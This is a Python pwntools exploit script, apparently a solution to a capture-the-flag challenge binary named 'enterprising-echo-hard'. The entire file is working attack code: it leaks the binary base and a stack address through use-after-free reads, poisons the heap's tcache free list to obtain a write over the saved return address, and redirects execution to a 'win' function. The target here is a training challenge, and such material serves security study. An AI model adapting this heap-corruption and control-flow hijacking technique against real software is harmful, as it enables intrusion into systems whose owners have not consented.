from pwn import *

p = process("/challenge/enterprising-echo-hard")

binecho_offset = 0x2110
win_offset = 0x1409

stack_leak_offset = b"64"
binary_leak_offset = b"0"

leaked_stack_addr_to_saved_rip_offset = -232

print(p.clean())

p.sendline(b"malloc 0 32")
p.sendline(b"free 0")
p.sendline(b"echo 0 " + binary_leak_offset)
x = p.clean()
binecho_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16) # sorry <3 just to filter, clean and format leaked address
base_addr = binecho_addr - binecho_offset
win_addr = base_addr + win_offset

print("[+] Leaked Base Addr ::", hex(base_addr))

p.sendline(b"stack_scanf")
p.sendline(b"\x00" * (64 - 8) + p64(0x100))
p.sendline(b"stack_free")

print(p.clean())

p.sendline(b"malloc 1 240")
p.sendline(b"free 1")
p.sendline(b"echo 1 " + stack_leak_offset)
x = p.clean()
print(x)
stack_addr = int(''.join([x.split(b"Data: ")[1].split(b"\n")[0].hex()[i:i+2] for i in range(0, len(x.split(b"Data: ")[1].split(b"\n")[0].hex()), 2)][::-1]), 16) # sorry <3 just to filter, clean and format leaked address
saved_rip_addr = stack_addr + leaked_stack_addr_to_saved_rip_offset

print("[+] Leaked Stack Addr ::", hex(stack_addr))
print("[+] Calculated Saved RIP addr ::", hex(saved_rip_addr))

print(p.clean())

p.sendline(b"malloc 2 8")
p.sendline(b"malloc 3 8")

print(p.clean())

p.sendline(b"free 2")
p.sendline(b"free 3")

print(p.clean())

p.sendline(b"scanf 3")
p.sendline(p64(saved_rip_addr))

print(p.clean())

p.sendline(b"malloc 4 8")
p.sendline(b"malloc 5 8")

print(p.clean())

p.sendline(b"scanf")
p.sendline(b"5")
p.sendline(p64(win_addr + 20)) # +20 because it ends with \x09 and scanf ignores that

print(p.clean())

p.sendline(b"quit")

print(p.clean())

p.close()

